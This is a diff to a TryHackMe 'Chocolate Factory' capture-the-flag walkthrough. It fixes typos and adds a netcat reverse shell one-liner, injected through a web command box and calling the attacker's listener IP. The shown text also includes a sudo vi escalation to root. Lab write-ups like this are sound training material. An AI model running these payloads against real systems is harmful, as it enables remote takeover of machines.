@@ -1,6 +1,6 @@
 # TryHackMe: Chocolate Factory
 
-The [Chocolate Factory](https://tryhackme.com/room/chocolatefactory) room on TryHackMe.com is ranked as Easy. And is really quite easy. It focuses on various things like......
+The [Chocolate Factory](https://tryhackme.com/room/chocolatefactory) room on TryHackMe.com is ranked as Easy. And is really quite easy. It focuses on things like finding steganography, finding files with improper file permissions and basic command injection.
 
 So, lets begin!
 
@@ -282,13 +282,19 @@ Permission denied, please try again.
 charlie@10.10.9.239's password: 
 ```
 
-But looks like this is not the password using which we can get access to "charlie's" account. If not for SSH then we can try the same credenitals on the login page as well. 
+But looks like this is not the password using which we can get access to "charlie's" account. If not for SSH then we can try the same credentials on the login page as well. 
 
 ## Gaining Access
 
 These credentials do work on the login page and redirects to a page from where we can execute commands. It clearly appears that we can use this for command injection. So, initially to make sure command injection can be performed we can run some simple commands like `whoami`, `id`, `ls -la` and others. And for all these commands we get a proper response as well. So, the next thing that we can do is use a reverse shell payload, enter it in the command box and start a listener on our local machine to catch the reverse connection. 
 
 We can use the payload:
+
+```
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.8.91.135 4444 >/tmp/f
+```
+
+And then start listening on our local machine using `nc`
 
 ```bash
 ┌──(kali㉿kali)-[~]
@@ -421,7 +427,7 @@ Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-115-generic x86_64)
 charlie@chocolate-factory:/$ 
 ```
 
-## Privilege Escation to `root`
+## Privilege Escalation to `root`
 
 Now that we have access to the system as "charlie", the first thing that we can look at are the command that "charile" can run with `sudo`.
 
@@ -435,7 +441,7 @@ User charlie may run the following commands on chocolate-factory:
     (ALL : !root) NOPASSWD: /usr/bin/vi
 ```
 
-It can be seen that "charlie" can run `/usr/bin/vi` with `sudo` privlege. So, we can head over to [GTFOBins](https://gtfobins.github.io/gtfobins/vi/) and use the command mentioned over there to gain access as `root` using the `/usr/bin/vi` command.
+It can be seen that "charlie" can run `/usr/bin/vi` with `sudo` privilege. So, we can head over to [GTFOBins](https://gtfobins.github.io/gtfobins/vi/) and use the command mentioned over there to gain access as `root` using the `/usr/bin/vi` command.
 
 ```bash
 charlie@chocolate-factory:/$ sudo vi -c ':!/bin/sh' /dev/null
